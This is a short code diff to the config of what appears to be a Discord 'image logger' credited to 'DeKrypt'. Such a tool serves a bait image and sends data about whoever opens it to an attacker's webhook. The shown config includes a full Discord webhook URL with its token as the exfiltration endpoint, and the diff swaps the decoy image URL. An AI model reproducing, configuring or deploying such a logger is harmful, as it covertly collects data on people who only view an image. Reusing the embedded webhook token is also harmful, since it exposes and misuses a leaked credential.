@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1117961339583864944/gUjpCjj7eprMrGGSqeI90f5Iia_MNR-HGP4MjoanHx5geH6x-HMViYVuhHRPRbC2TI-d",
-    "image": "https://www.euronics.it/dw/image/v2/BFPN_PRD/on/demandware.static/-/Sites-catalog_euronics_master/default/dw010bcf75/hi-res/222000306.jpg?sw=1000&q=90&strip=false", # You can also have a custom image by using a URL argument
+    "image": "https://cdn2.unrealengine.com/faq-singular-card-102721-739x1023-651e0791cffe.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
